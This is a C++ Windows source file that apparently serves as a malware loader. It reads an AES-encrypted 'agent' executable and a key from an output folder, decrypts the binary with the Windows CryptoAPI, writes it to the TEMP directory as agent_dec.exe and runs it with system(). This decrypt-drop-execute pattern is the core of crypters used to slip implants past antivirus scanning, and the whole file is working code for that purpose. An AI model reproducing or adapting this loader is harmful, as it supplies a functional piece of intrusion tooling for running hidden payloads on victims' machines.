

#include <windows.h>
#include <wincrypt.h>
#include <fstream>
#include <iostream>
#include <vector>

#pragma comment(lib, "advapi32.lib")

std::vector<BYTE> aes_decrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    std::vector<BYTE> out = data;

    std::cout << "[*] Starting AES decryption..." << std::endl;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "[!] CryptAcquireContext failed: " << GetLastError() << std::endl;
        return {};
    }

    std::cout << "[*] Preparing key blob for CryptImportKey..." << std::endl;
    BYTE blobBuffer[sizeof(BLOBHEADER) + sizeof(DWORD) + 16];
    BLOBHEADER* hdr = (BLOBHEADER*)blobBuffer;
    DWORD* dwKeyLen = (DWORD*)(blobBuffer + sizeof(BLOBHEADER));
    BYTE* pbKey = blobBuffer + sizeof(BLOBHEADER) + sizeof(DWORD);

    hdr->bType = PLAINTEXTKEYBLOB;
    hdr->bVersion = CUR_BLOB_VERSION;
    hdr->reserved = 0;
    hdr->aiKeyAlg = CALG_AES_128;

    *dwKeyLen = 16;
    memcpy(pbKey, key.data(), 16);

    std::cout << "[*] Importing AES key using CryptImportKey..." << std::endl;
    if (!CryptImportKey(hProv, blobBuffer, sizeof(blobBuffer), 0, 0, &hKey)) {
        std::cerr << "[!] CryptImportKey failed: " << GetLastError() << std::endl;
        CryptReleaseContext(hProv, 0);
        return {};
    }
    std::cout << "[+] AES key successfully imported." << std::endl;

    DWORD len = out.size();
    if (!CryptDecrypt(hKey, 0, TRUE, 0, out.data(), &len)) {
        std::cerr << "[!] CryptDecrypt failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return {};
    }

    out.resize(len);
    std::cout << "[+] Decryption successful. Size: " << len << " bytes" << std::endl;

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return out;
}

int main() {
    std::ifstream enc("output/encrypted_agent.exe", std::ios::binary);
    std::ifstream key("output/agent_aes.key", std::ios::binary);

    if (!enc || !key) {
        std::cerr << "[!] Failed to open encrypted_agent.exe or AES key." << std::endl;
        return 1;
    }

    std::vector<BYTE> data((std::istreambuf_iterator<char>(enc)), {});
    std::vector<BYTE> aes_key((std::istreambuf_iterator<char>(key)), {});

    std::cout << "[*] Loaded encrypted payload: " << data.size() << " bytes" << std::endl;

    auto decrypted = aes_decrypt(data, aes_key);
    if (decrypted.empty()) {
        std::cerr << "[!] Decryption failed!" << std::endl;
        return 1;
    }

    std::string temp = std::getenv("TEMP");
    std::string path = temp + "\\agent_dec.exe";

    std::ofstream out(path, std::ios::binary);
    out.write((char*)decrypted.data(), decrypted.size());
    out.close();

    std::cout << "[+] Written decrypted agent to: " << path << std::endl;
    std::cout << "[*] Executing..." << std::endl;
    system(path.c_str());

    return 0;
}

